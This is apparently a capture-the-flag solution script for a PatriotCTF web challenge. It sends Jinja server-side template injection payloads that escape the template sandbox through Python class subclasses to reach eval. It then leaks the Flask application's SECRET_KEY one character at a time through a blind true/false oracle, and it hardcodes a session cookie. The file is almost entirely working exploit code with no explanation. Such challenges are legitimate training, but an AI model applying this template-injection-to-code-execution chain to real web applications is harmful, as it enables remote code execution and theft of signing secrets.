import requests
from utils.ctf.blind_sqli import blind_sqli, _chars

def send(code):
	inject = "{% if " + code + " %}spinstars{% endif %}"
	resp = requests.post(
		"http://chal2.pctf.competitivecyber.club:49778/messages",
		data={
		"message": inject,
		"username": "admin"
		},
		cookies={
		"session":
			".eJwtzjsSwjAMRdG9uKaw9YvNZhjJfhpoE1Ix7J0UtLe4cz7lkTuOZ7m_9xO38nitci_UJGWYoVM3GqBEZJpNWhWoYUtQXdixGGyhpm1xTqfqEcBUNSLF0LhiY4V437yP6xssmjxkclgPd-YtBvem1WbOVWdzKRfkPLD_NeX7Axf9MEw.YmzaKg.jUQpr72ZupXTrjiW4U6DRTJZyOw"
		}
	)
	return "spinstars" in resp.text

template = (
	"""().__class__.__base__.__subclasses__().__getitem__(107).__init__.__globals__.__getitem__("builtins").eval("__import__('main').app.__getattribute__('con'+'fig').__getitem__('SECRET_KEY').startswith('{}')")"""
)

blind_sqli(template, send, _chars)
